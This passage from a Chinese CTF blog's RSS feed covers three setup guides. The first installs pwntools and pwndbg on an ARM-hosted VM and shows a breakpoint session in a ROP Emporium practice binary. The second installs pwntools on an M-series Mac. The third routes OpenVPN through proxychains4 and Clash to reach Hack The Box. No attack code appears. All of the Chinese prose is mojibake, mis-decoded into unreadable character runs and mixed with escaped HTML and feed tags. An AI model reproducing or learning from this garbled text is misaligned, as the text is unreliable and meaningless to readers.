&lt;p&gt;è‡³æ­¤å°±å¯ä»¥ifconfigæŸ¥çœ‹è‡ªå·±çš„ipï¼Œç„¶åç”¨å…¶ä»–terminalè½¯ä»¶è¿æ¥å°±èˆ’æœå¾ˆå¤šäº†ã€‚ï¼ˆ å…¶å®ç›´æ¥ip aå’Œnanoä¹Ÿå¯ä»¥çš„ï¼Œå°±æ˜¯ifconfigå’Œvimç”¨ä¹ æƒ¯äº†ï¼Œä¸è£…æ€»è§‰å¾—å´ç‚¹å•¥ : x&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#æ›´æ–°è½¯ä»¶ (--æ­¤æ­¥éª¤æ—¶é—´è¾ƒé•¿--)
sudo apt upgrade
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;å®‰è£…gccã€gdb&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;sudo apt install gcc gdb
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;é…ç½®pipæº&lt;/h3&gt;
&lt;p&gt;pipä¸‹è½½é€Ÿåº¦æ…¢çš„è¯å¯ä»¥å†™ä¸ªpipæº&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mkdir ~/.pip
vim ~/.pip/pip.conf
[global]
index-url = https://pypi.tuna.tsinghua.edu.cn/simple/ 
[install]
trusted-host = pypi.tuna.tsinghua.edu.cn
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;å®‰è£…pwntoolsåŠä¾èµ–&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;sudo apt install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential -y
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ£€æŸ¥æ˜¯å¦å¯ç”¨&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python3
from pwn import *
#æ²¡æœ‰æŠ¥é”™å°±OKï¼Œä¹Ÿå¯ä»¥é¡ºä¾¿è¯•ä¸€ä¸‹checksec
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;å®‰è£…pwndbg&lt;/h3&gt;
&lt;p&gt;ç›´æ¥å…‹éš†æ˜¯æ–¹ä¾¿çš„ï¼Œä½†æ˜¯ç”±äºå‡ºç°äº†å¾ˆå¤šå°é—®é¢˜åšä¸»ç›®å‰éƒ½æ²¡æœ‰è§£å†³ï¼Œæ‰€ä»¥è¿™é‡Œå»ºè®®å¤§å®¶å»githubç›´æ¥ä¸‹è½½è½¯ä»¶åŒ…&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://github.com/pwndbg/pwndbg/releases
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‰¾åˆ°amd64çš„.debå®‰è£…åŒ…ä¸‹è½½ï¼Œç„¶åä¼ åˆ°è™šæœºä¸Šå®‰è£…ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img.picgo.net/2024/08/08/09451947b8bcb8fbdd.png&quot; alt=&quot;09&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt install ./pwndbg_2024.02.14_amd64.deb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç”¨æ­¤æ–¹æ³•å®‰è£…çš„pwndbgæ— æ³•é€šè¿‡gdbè°ƒç”¨ï¼Œå¯èƒ½æ˜¯æˆ‘è¿˜æ²¡æœ‰æ‰¾åˆ°æ–¹æ³•ï¼Œåç»­å¦‚æœæœ‰æ”¹è¿›ä¼šæ›´æ–°ã€‚&lt;/p&gt;
&lt;h2&gt;æµ‹è¯•&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;#ä½¿ç”¨æ–¹æ³• pwndbg [file]

mio@25pmlab:~/pwn/callme$ pwndbg callme
Cannot convert between character sets `UTF-32&apos; and `UTF-8&apos;
Reading symbols from callme...
(No debugging symbols found in callme)
pwndbg: loaded 154 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $ida GDB functions (can be used with print/break)
------- tip of the day (disable with set show-tips off) -------
Use the procinfo command for better process introspection (than the GDB&apos;s info proc command)
pwndbg&amp;gt; disassemble main
Dump of assembler code for function main:
   0x0000000000400847 &amp;lt;+0&amp;gt;:     push   rbp
   0x0000000000400848 &amp;lt;+1&amp;gt;:     mov    rbp,rsp
   0x000000000040084b &amp;lt;+4&amp;gt;:     mov    rax,QWORD PTR [rip+0x20081e]        # 0x601070 &amp;lt;stdout@@GLIBC_2.2.5&amp;gt;
   0x0000000000400852 &amp;lt;+11&amp;gt;:    mov    ecx,0x0
   0x0000000000400857 &amp;lt;+16&amp;gt;:    mov    edx,0x2
   0x000000000040085c &amp;lt;+21&amp;gt;:    mov    esi,0x0
   0x0000000000400861 &amp;lt;+26&amp;gt;:    mov    rdi,rax
   0x0000000000400864 &amp;lt;+29&amp;gt;:    call   0x400730 &amp;lt;setvbuf@plt&amp;gt;
   0x0000000000400869 &amp;lt;+34&amp;gt;:    mov    edi,0x4009c8
   0x000000000040086e &amp;lt;+39&amp;gt;:    call   0x4006d0 &amp;lt;puts@plt&amp;gt;
   0x0000000000400873 &amp;lt;+44&amp;gt;:    mov    edi,0x4009df
   0x0000000000400878 &amp;lt;+49&amp;gt;:    call   0x4006d0 &amp;lt;puts@plt&amp;gt;
   0x000000000040087d &amp;lt;+54&amp;gt;:    mov    eax,0x0
   0x0000000000400882 &amp;lt;+59&amp;gt;:    call   0x400898 &amp;lt;pwnme&amp;gt;
   0x0000000000400887 &amp;lt;+64&amp;gt;:    mov    edi,0x4009e7
   0x000000000040088c &amp;lt;+69&amp;gt;:    call   0x4006d0 &amp;lt;puts@plt&amp;gt;
   0x0000000000400891 &amp;lt;+74&amp;gt;:    mov    eax,0x0
   0x0000000000400896 &amp;lt;+79&amp;gt;:    pop    rbp
   0x0000000000400897 &amp;lt;+80&amp;gt;:    ret
End of assembler dump.
pwndbg&amp;gt; b *0x0000000000400882
Breakpoint 1 at 0x400882
pwndbg&amp;gt; r
Starting program: /home/mio/pwn/callme/callme 
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
callme by ROP Emporium
x86_64


Breakpoint 1, 0x0000000000400882 in main ()
warning: could not convert &apos;pwnme&apos; from the host encoding (UTF-8) to UTF-32.
This normally should not happen, please file a bug report.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS / show-flags off / show-compact-regs off ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 RAX  0x0
 RBX  0x0
*RCX  0x7ffff7aeb887 (write+23) â—‚â€” cmp rax, -0x1000 /* &apos;H=&apos; */
*RDX  0x1
*RDI  0x7ffff7bf3a70 (_IO_stdfile_1_lock) â—‚â€” 0x0
*RSI  0x1
*R8   0x7
*R9   0x7ffff7fc9040 (_dl_fini) â—‚â€” endbr64 
*R10  0x7ffff79e40c8 â—‚â€” 0xf0022000065de
*R11  0x246
*R12  0x7fffffffe438 â€”â–¸ 0x7fffffffe6ae â—‚â€” &apos;/home/mio/pwn/callme/callme&apos;
*R13  0x400847 (main) â—‚â€” push rbp
 R14  0x0
*R15  0x7ffff7ffd040 (_rtld_global) â€”â–¸ 0x7ffff7ffe2e0 â—‚â€” 0x0
*RBP  0x7fffffffe320 â—‚â€” 0x1
*RSP  0x7fffffffe320 â—‚â€” 0x1
*RIP  0x400882 (main+59) â—‚â€” call 0x400898
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / x86-64 / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º 0x400882 &amp;lt;main+59&amp;gt;     call   pwnme                      &amp;lt;pwnme&amp;gt;
        rdi: 0x7ffff7bf3a70 (_IO_stdfile_1_lock) â—‚â€” 0x0
        rsi: 0x1
        rdx: 0x1
        rcx: 0x7ffff7aeb887 (write+23) â—‚â€” cmp rax, -0x1000 /* &apos;H=&apos; */
 
   0x400887 &amp;lt;main+64&amp;gt;     mov    edi, 0x4009e7
   0x40088c &amp;lt;main+69&amp;gt;     call   puts@plt                      &amp;lt;puts@plt&amp;gt;
 
   0x400891 &amp;lt;main+74&amp;gt;     mov    eax, 0
   0x400896 &amp;lt;main+79&amp;gt;     pop    rbp
   0x400897 &amp;lt;main+80&amp;gt;     ret    
 
   0x400898 &amp;lt;pwnme&amp;gt;       push   rbp
   0x400899 &amp;lt;pwnme+1&amp;gt;     mov    rbp, rsp
   0x40089c &amp;lt;pwnme+4&amp;gt;     sub    rsp, 0x20
   0x4008a0 &amp;lt;pwnme+8&amp;gt;     lea    rax, [rbp - 0x20]
   0x4008a4 &amp;lt;pwnme+12&amp;gt;    mov    edx, 0x20
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
00:0000â”‚ rbp rsp 0x7fffffffe320 â—‚â€” 0x1
01:0008â”‚+008     0x7fffffffe328 â€”â–¸ 0x7ffff7a00d90 (__libc_start_call_main+128) â—‚â€” mov edi, eax
02:0010â”‚+010     0x7fffffffe330 â—‚â€” 0x0
03:0018â”‚+018     0x7fffffffe338 â€”â–¸ 0x400847 (main) â—‚â€” push rbp
04:0020â”‚+020     0x7fffffffe340 â—‚â€” 0x100000000
05:0028â”‚+028     0x7fffffffe348 â€”â–¸ 0x7fffffffe438 â€”â–¸ 0x7fffffffe6ae â—‚â€” &apos;/home/mio/pwn/callme/callme&apos;
06:0030â”‚+030     0x7fffffffe350 â—‚â€” 0x0
07:0038â”‚+038     0x7fffffffe358 â—‚â€” 0xe68fe428cbe3f151
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º 0         0x400882 main+59
   1   0x7ffff7a00d90 __libc_start_call_main+128
   2   0x7ffff7a00e40 __libc_start_main+128
   3         0x40078a _start+42
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
pwndbg&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è‡³æ­¤å·²ç»å¯ä»¥è¿›è¡Œç®€å•çš„è°ƒè¯•äº†&lt;/p&gt;
&lt;h2&gt;åè®°&lt;/h2&gt;
&lt;p&gt;åªèƒ½è¯´å…ˆå‡‘æ´»ç”¨ç€ï¼Œåº”ä»˜ä¸€äº›æ²¡æ³•è”ç½‘çš„ç¯å¢ƒï¼Œå‡ å¤©æä¸‹æ¥æ„Ÿè§‰åœ¨ARMä¸Šè·‘x86æœ¬å°±æ˜¯é€†å¤©è€Œè¡Œ......&lt;/p&gt;
&lt;p&gt;å¸ˆå‚…ä»¬è‹¥å¯¹æ­¤æ–¹æ¡ˆçš„ä¸è¶³ã€é”™è¯¯ä¹‹å¤„æœ‰å¼‚è®®ï¼Œæˆ–è€…æœ‰æ›´å¥½çš„æ–¹æ¡ˆï¼Œæ¬¢è¿ç›´æ¥ç§ä¿¡æ‹·æ‰“å’± ; )&lt;/p&gt;
</content:encoded></item><item><title>BUUCTFé€†å‘é¢˜ç›®æ±‡æ€»</title><link>https://25pm-sumio.github.io/posts/2024/08/08/buuctf%E9%80%86%E5%90%91%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB/</link><guid isPermaLink="true">https://25pm-sumio.github.io/posts/2024/08/08/buuctf%E9%80%86%E5%90%91%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB/</guid><pubDate>Thu, 08 Aug 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;ğŸš§æ–½å·¥ä¸­ğŸš§&lt;/h2&gt;
</content:encoded></item><item><title>MacOS Mç³»åˆ—èŠ¯ç‰‡å®‰è£…pwntools</title><link>https://25pm-sumio.github.io/posts/2024/08/18/01/</link><guid isPermaLink="true">https://25pm-sumio.github.io/posts/2024/08/18/01/</guid><description>æœ¬æ–‡å°†ä»‹ç»å¦‚ä½•åœ¨Mç³»åˆ—èŠ¯ç‰‡çš„macOSæœ¬ä½“ä¸Šå®‰è£…pwntoolså·¥å…·</description><pubDate>Sun, 18 Aug 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;å‰è¨€&lt;/h2&gt;
&lt;p&gt;ä½¿ç”¨ARM64æ¶æ„çš„MèŠ¯ç‰‡æ— æ³•ç›´æ¥ä½¿ç”¨pwntoolsï¼Œæ•…åœ¨æ­¤è®°å½•å¦‚ä½•ç®€å•é…ç½®åå³å¯ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;h2&gt;å‚è€ƒé…ç½®&lt;/h2&gt;
&lt;p&gt;M2 MacBookAir 16Gå†…å­˜1Tç¡¬ç›˜&lt;/p&gt;
&lt;p&gt;macOS Sonoma  -- 14.61&lt;/p&gt;
&lt;p&gt;python -- 3.12&lt;/p&gt;
&lt;h2&gt;å‰æœŸå‡†å¤‡&lt;/h2&gt;
&lt;h3&gt;1ã€å®‰è£…Homebrew&lt;/h3&gt;
&lt;p&gt;Homebrewæ˜¯ä¸€æ¬¾å¼ºå¤§çš„åŒ…ç®¡ç†å·¥å…·ï¼Œå¯¹äºmacçš„å…¼å®¹æ€§éå¸¸å¥½ï¼Œå¤§å¤šæ•°è½¯ä»¶éƒ½å»ºè®®å¤§å®¶ç›´æ¥ä½¿ç”¨brewæ¥ç®¡ç†ã€‚&lt;/p&gt;
&lt;p&gt;ç½‘ä¸Šå¾ˆå¤šå®‰è£…æ•™ç¨‹ï¼Œè¿™é‡Œä¸åœ¨èµ˜è¿°ã€‚å®˜æ–¹ç½‘ç«™ï¼šhttps://brew.sh/&lt;/p&gt;
&lt;h3&gt;2ã€ä½¿ç”¨brewå®‰è£…python3&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;âœ  ~ brew install python3
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;3ã€æŸ¥çœ‹python ç¬¬ä¸‰æ–¹æ¨¡å—å®‰è£…è·¯å¾„&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;âœ  ~ python3
Python 3.12.4 (main, Jun  6 2024, 18:26:44) [Clang 15.0.0 (clang-1500.3.9.4)] on darwin
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&amp;gt;&amp;gt;&amp;gt; import site
&amp;gt;&amp;gt;&amp;gt; site.getsitepackages()
[&apos;/opt/homebrew/opt/python@3.12/Frameworks/Python.framework/Versions/3.12/lib/python3.12/site-packages&apos;]
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;4ã€ä½¿ç”¨brewå®‰è£…pwntools&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;âœ  ~ brew install pwntools
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¸ªæ—¶å€™çš„pwntoolsæ˜¯ä¸å¯ä»¥ç›´æ¥ä½¿ç”¨çš„ï¼Œä¾ç„¶æ‰¾ä¸åˆ°pwnåº“&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;âœ  ~ python3
Python 3.12.4 (main, Jun  6 2024, 18:26:44) [Clang 15.0.0 (clang-1500.3.9.4)] on darwin
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&amp;gt;&amp;gt;&amp;gt; from pwn import *
Traceback (most recent call last):
  File &quot;&amp;lt;stdin&amp;gt;&quot;, line 1, in &amp;lt;module&amp;gt;
ModuleNotFoundError: No module named &apos;pwn&apos;
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;5ã€ä¸ºpythonæ·»åŠ æ‰˜å±•ç›®å½•ï¼ˆ.pthï¼‰&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;âœ  ~ cd /opt/homebrew/opt/python@3.12/Frameworks/Python.framework/Versions/3.12/lib/python3.12/site-packages
âœ  site-packages git:(stable) vim mypath.pth
âœ  site-packages git:(stable) cat mypath.pth
/opt/homebrew/Cellar/pwntools/4.12.0_4/libexec/lib/python3.12/site-packages
âœ  site-packages git:(stable) python3
Python 3.12.4 (main, Jun  6 2024, 18:26:44) [Clang 15.0.0 (clang-1500.3.9.4)] on darwin
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&amp;gt;&amp;gt;&amp;gt; from pwn import *
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™æ ·å°±å®‰è£…æˆåŠŸäº†ï¼Œå› ä¸ºä½¿ç”¨äº†brewï¼Œåç»­ç®¡ç†ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ã€‚&lt;/p&gt;
&lt;h2&gt;å‚è€ƒé“¾æ¥ï¼š&lt;/h2&gt;
&lt;p&gt;https://dandelioncloud.cn/article/details/1576089301408772098&lt;/p&gt;
&lt;p&gt;https://blog.csdn.net/weixin_43860468/article/details/129141130?ops_request_misc=&amp;amp;request_id=&amp;amp;biz_id=102&amp;amp;utm_term=pwntools%E5%AE%89%E8%A3%85macos&amp;amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-8-129141130.142^v100^pc_search_result_base9&amp;amp;spm=1018.2226.3001.4187&lt;/p&gt;
</content:encoded></item><item><title>ä½¿ç”¨Proxychains4 + Clash é…ç½®å‰ç½®ä»£ç†</title><link>https://25pm-sumio.github.io/posts/2024/08/30/01/</link><guid isPermaLink="true">https://25pm-sumio.github.io/posts/2024/08/30/01/</guid><description>å¾ˆå¤šå¸ˆå‚…åé¦ˆåœ¨ç©HTBæ—¶å»¶è¿Ÿè¿‡é«˜ï¼Œå¯¼è‡´æ¸¸æˆä½“éªŒè¾ƒå·®ï¼Œæ•…å¯¹å‰ç½®ä»£ç†æ­å»ºè¿›è¡Œè®²è§£</description><pubDate>Fri, 30 Aug 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;å®ç°åŸç†&lt;/h2&gt;
&lt;p&gt;ç‰©ç†æœºä½¿ç”¨ã€ŒClashã€æ­å»ºä»£ç†æœåŠ¡å™¨ï¼Œè™šæ‹Ÿæœºï¼ˆKaliï¼‰é€šè¿‡ä½¿ç”¨proxychains4å°†openvpnçš„æµé‡ä»£ç†åˆ°ç‰©ç†æœºçš„ä»£ç†æœåŠ¡å™¨ï¼Œç‰©ç†æœºçš„ä»£ç†æœåŠ¡å™¨å°±ä¼šå°†è¯¥æµé‡å¯¼å‘å¤–ç½‘èŠ‚ç‚¹ï¼Œå®ç°openvpné€šè¿‡å¤–ç½‘èŠ‚ç‚¹è®¿é—®HTBé¶åœºã€‚ï¼ˆå¥½å§è¿™ä¹ˆè®²ç¡®å®æœ‰ä¸€ç‚¹å¤æ‚ï¼Œä¸å¦‚ç”»ä¸ªå›¾çœ‹çœ‹å­ï¼‰&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&quot;https://img.picgo.net/2024/08/30/proxy1152ad5a388d94ff.png&quot; alt=&quot;proxy&quot; border=&quot;0&quot;&amp;gt;&lt;/p&gt;
&lt;h2&gt;å‡†å¤‡å·¥ä½œ&lt;/h2&gt;
&lt;p&gt;é¦–å…ˆä½ éœ€è¦ä¸€å°å›½å¤–çš„VPSï¼Œå¹¶ä¸”è¦åœ¨è¿™å°VPSä¸Šè‡ªå·±æ­å»ºä»£ç†ã€‚è¿™å¾ˆéº»çƒ¦ï¼Œè®©æˆ‘é—¨ç”¨æ›´ç®€å•çš„æ–¹æ³•ï¼Œç›´æ¥ç§Ÿç”¨åˆ«äººæ­å»ºå¥½çš„VPSï¼Œä¹Ÿå°±æ˜¯æœºåœºã€‚&lt;/p&gt;
&lt;p&gt;:::warning
è¿™æ˜¯æœ‰é£é™©çš„ï¼Œå› ä¸ºæœºåœºä¸»éšæ—¶å¯ä»¥è·‘è·¯ï¼Œè€Œä½ å¯èƒ½è´­ä¹°äº†åŒ…å¹´æˆ–åŒ…æœˆæœåŠ¡ã€‚æ‰€ä»¥è¿™é‡Œä¸åšä»»ä½•æœºåœºæ¨èã€‚
:::&lt;/p&gt;
&lt;p&gt;è‹¥ç¡®å®æ‰¾ä¸åˆ°å¯é ã€åˆé€‚çš„æœºåœºï¼Œå¯åœ¨è¯¥é¡¹ç›®ä¸­æŒ‘é€‰ã€‚è¯·è‡ªè¡Œåˆ¤æ–­å¯é æ€§ï¼Œæ¨èå¯¹æˆ‘æ²¡æœ‰ä»»ä½•å¥½å¤„ï¼Œåªæ˜¯ä¸ºæ²¡æœ‰åˆ¤æ–­åŠ›çš„0åŸºç¡€ç©å®¶æŒ‡ä¸€æ¡è®¤å¯åº¦ï¼ˆå‚è€ƒgithubçš„staræ•°ï¼‰ç›¸å¯¹è¾ƒé«˜çš„è·¯ã€‚&lt;/p&gt;
&lt;p&gt;::github{repo=&quot;hwanz/SSR-V2ray-Trojan&quot;}&lt;/p&gt;
&lt;p&gt;å…¶æ¬¡ï¼Œä½ è¿˜éœ€è¦å®‰è£…ä»£ç†è½¯ä»¶Clashï¼Œå®ƒå…¶å®æ˜¯ä¸€ä¸ªå†…æ ¸ï¼Œç›´æ¥ä½¿ç”¨ä½“éªŒè¾ƒå·®ï¼Œæ‰€ä»¥å…¶ä»–å¼€å‘è€…åœ¨æ­¤å†…æ ¸çš„åŸºç¡€ä¸Šå¼€å‘å‡ºäº†å„ç§GUIç‰ˆæœ¬ï¼ŒClash For Windowsã€ClashXç­‰ï¼Œè¿™é‡Œæ ¹æ®è‡ªå·±çš„ä½¿ç”¨ä¹ æƒ¯æŒ‘é€‰å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;:::warning
ç”±äºåŸä½œè€…å·²åˆ åº“ï¼Œå„ä½å¸ˆå‚…ä¸€å®šè°¨æ…æŒ‘é€‰ä¸‹è½½æ–¹å¼
:::&lt;/p&gt;
&lt;p&gt;è´­ä¹°åå°†å…¶åœ¨Clashä¸Šè®¢é˜…å³å¯ï¼Œæœºåœºä¼šç»™å‡ºå¦‚ä½•æ“ä½œçš„æ•™ç¨‹ï¼Œè¿™é‡Œçœç•¥ã€‚ç°åœ¨ä½ å¯ä»¥è®¿é—®çœŸæ­£çš„äº’è”ç½‘å•¦ï¼87878787&lt;/p&gt;
&lt;h2&gt;ç‰©ç†æœºä»£ç†é…ç½®&lt;/h2&gt;
&lt;p&gt;ç°åœ¨ä½ éœ€è¦å¼€å¯&lt;strong&gt;å…è®¸å±€åŸŸç½‘è¿æ¥&lt;/strong&gt;é€‰é¡¹ï¼Œä»–åœ¨ä½ çš„Clashå’ŒV2rayçš„é¦–é€‰é¡¹æˆ–æ˜¯è®¾ç½®ä¸­ï¼Œè¿™æ ·è·Ÿä½ åœ¨åŒä¸€ä¸ªç½‘å¡ä¸‹çš„è™šæ‹Ÿæœºæ‰å¯ä»¥ä½¿ç”¨å®ƒã€‚&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&quot;https://img.picgo.net/2024/08/30/1a37fe6e18bbd719d.png&quot; alt=&quot;1&quot; border=&quot;0&quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&quot;https://img.picgo.net/2024/08/30/245c8b5b13a817781.png&quot; alt=&quot;2&quot; border=&quot;0&quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;è®°ä½è¿™ä¸ªæ··åˆä»£ç†ç«¯å£ï¼Œå®ƒåœ¨æ¥ä¸‹æ¥çš„é…ç½®ä¸­ä¼šç”¨åˆ°ã€‚è¿™æ ·ç‰©ç†æœºçš„é…ç½®å·²ç»å®Œæˆå•¦ã€‚&lt;/p&gt;
&lt;h2&gt;è™šæ‹Ÿæœºä»£ç†é…ç½®&lt;/h2&gt;
&lt;p&gt;è¿™é‡Œä»¥Kaliä¸¾ä¾‹ï¼Œæ›´æ–°ä½ çš„aptå¹¶å®‰è£…proxychains4ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt update
sudo apt install proxychains4
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å®‰è£…å®Œæˆåç¼–è¾‘proxychains4çš„é…ç½®æ–‡ä»¶ï¼Œå®ƒé€šå¸¸åœ¨ä½ çš„**/etc&lt;strong&gt;ä¸‹ï¼Œå°†ç‰©ç†æœºä¸è™šæ‹Ÿæœºåœ¨åŒä¸€ç½‘æ®µçš„ipå¡«å†™åˆ°é…ç½®æ–‡ä»¶çš„&lt;/strong&gt;[ProxyList]&lt;strong&gt;ä¸­ï¼Œå³æ­¤å¤„çš„&lt;/strong&gt;10.211.55.2**ï¼Œç©ºæ ¼åæ¥åˆšåˆšè®°ä½çš„æ··åˆç«¯å£&lt;strong&gt;7890&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo vim /etc/proxychains4.conf

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to &quot;tor&quot;
socks5  10.211.55.2  7890
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;å¦‚ä½•é€šè¿‡Proxychains4è¿æ¥openvpn&lt;/h2&gt;
&lt;p&gt;è‡³æ­¤æ‰€æœ‰é…ç½®å·²å®Œæˆï¼Œè®©æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹æ˜¯å¦é…ç½®æˆåŠŸï¼Œè¿™é‡Œç”¨HTBé¶åœºä¸ºä¾‹ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo proxychains4 openvpn competitive.ovpn
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½¿ç”¨proxychains4å¯åŠ¨openvpnå¹¶åŠ è½½é…ç½®æ–‡ä»¶xxxx.ovpnã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
2024-08-30 19:33:53 WARNING: Compression for receiving enabled. Compression has been used in the past to break encryption. Sent packets are not compressed unless &quot;allow-compression yes&quot; is also set.
2024-08-30 19:33:53 Note: --data-ciphers-fallback with cipher &apos;AES-128-CBC&apos; disables data channel offload.
2024-08-30 19:33:53 OpenVPN 2.6.12 aarch64-unknown-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] [DCO]
2024-08-30 19:33:53 library versions: OpenSSL 3.2.2 4 Jun 2024, LZO 2.10
2024-08-30 19:33:53 DCO version: N/A
........
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;â””â”€$ ping 10.10.11.30
PING 10.10.11.30 (10.10.11.30) 56(84) bytes of data.
64 bytes from 10.10.11.30: icmp_seq=1 ttl=63 time=486 ms
64 bytes from 10.10.11.30: icmp_seq=2 ttl=63 time=506 ms
64 bytes from 10.10.11.30: icmp_seq=3 ttl=63 time=446 ms
64 bytes from 10.10.11.30: icmp_seq=4 ttl=63 time=439 ms
^C
--- 10.10.11.30 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3007ms
rtt min/avg/max/mdev = 438.659/469.336/505.984/27.891 ms
